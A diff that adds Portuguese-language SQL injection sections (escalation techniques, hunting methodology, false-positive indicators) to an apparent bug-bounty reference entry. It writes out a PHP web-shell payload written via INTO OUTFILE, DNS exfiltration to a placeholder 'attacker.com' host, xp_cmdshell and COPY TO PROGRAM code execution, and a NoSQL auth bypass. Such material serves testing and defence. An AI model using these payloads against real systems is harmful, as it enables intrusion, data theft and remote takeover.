@@ -136,6 +136,30 @@ Casos reais e mentalidade de ataque (RWBH): Yahoo (busca/filtros) e Uber (APIs i
 
 Fonte: cvelistV5 (MITRE CVE List v5 dataset)
 
+## Escalation Techniques
+- **Exfiltrar schema do banco:** usar `information_schema.tables`, `information_schema.columns` (MySQL/Postgres) ou `sys.tables` (MSSQL) para mapear toda a estrutura e depois extrair tabelas de interesse (credenciais, tokens, PII).
+- **Obter web shell:** em MySQL com `FILE` privilege, escrever payload PHP via `UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` e acessar via browser.
+- **Extrair via out-of-band:** quando blind, usar `SELECT ... INTO OUTFILE` para gravar dados no web root ou exfiltrar via DNS (`LOAD_FILE(CONCAT('\\\\',query,'.attacker.com\\a'))` em MySQL, `copy ... to program` em Postgres).
+- **Escalar blind para data dump:** boolean-based com `SUBSTR()` + iteracao caractere por caractere; time-based com `IF(condition, SLEEP(n), 0)`. Automatizar com sqlmap ou scripts custom.
+- **RCE direto:** `xp_cmdshell` (MSSQL), `COPY ... TO PROGRAM` (Postgres), `sys_exec` (MySQL UDF). Requer permissoes elevadas no banco.
+- **Combinar com NoSQL:** aplicacoes com MongoDB podem ser vulneraveis a `{$ne: ""}` para bypass de auth e `$where` para execucao de JS arbitrario no servidor.
+
+## Hunting Methodology
+1. Mapear todos os endpoints que aceitam entrada do usuario e resultam em consultas ao banco -- forms de login, busca, filtros, ordenacao, paginacao, relatorios, APIs REST/GraphQL.
+2. Inserir `'` (single quote) em cada campo e observar erros, mudancas de comportamento ou anomalias. Se a aplicacao tratar `'` como dado puro, nao ha injecao.
+3. Para deteccao classica (in-band): testar `UNION SELECT NULL--` incrementando colunas ate a query funcionar; usar `@@version`, `version()`, `v$version` para identificar o SGBD.
+4. Para boolean-based: comparar `' AND 1=1--` vs `' AND 1=2--` e observar diferenca na resposta.
+5. Para time-based: `' AND SLEEP(5)--` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `'; SELECT pg_sleep(5)--` (Postgres).
+6. Para second-order: inserir payload em campo de cadastro/perfil e observar se executa quando o dado e usado em outra query posteriormente (ex.: username no relatório admin).
+7. Automatizar com sqlmap apos confirmar injecao manual -- usar `--technique=BEUST` para cobrir todos os vetores.
+
+## False Positive Indicators
+- Aplicacao retorna erro generico (ex.: "invalid input") sem evidencia de parse SQL -- pode ser validacao de formato, nao injecao.
+- `' OR 1=1` retorna mesma resposta que `' OR 1=2` -- indica que a entrada nao e interpretada como SQL.
+- Erro de banco aparece mas e tratado (status 400/422 com mensagem generica, sem stack trace ou detalhes internos) -- pode indicar sanitizacao adequada.
+- ORM com parametrizacao automatica mas endpoint testado via concatenacao em log/debug (aparece vulneravel em dev, nao em prod).
+- Tempo de resposta varia por carga do servidor, nao por payload -- repetir time-based 3+ vezes e comparar com baseline para confirmar causalidade.
+
 ## Recommendation
 1. Usar queries parametrizadas/prepared statements em todas as consultas, incluindo `IN`, `ORDER BY`, `LIMIT` e relatórios.
 ```java
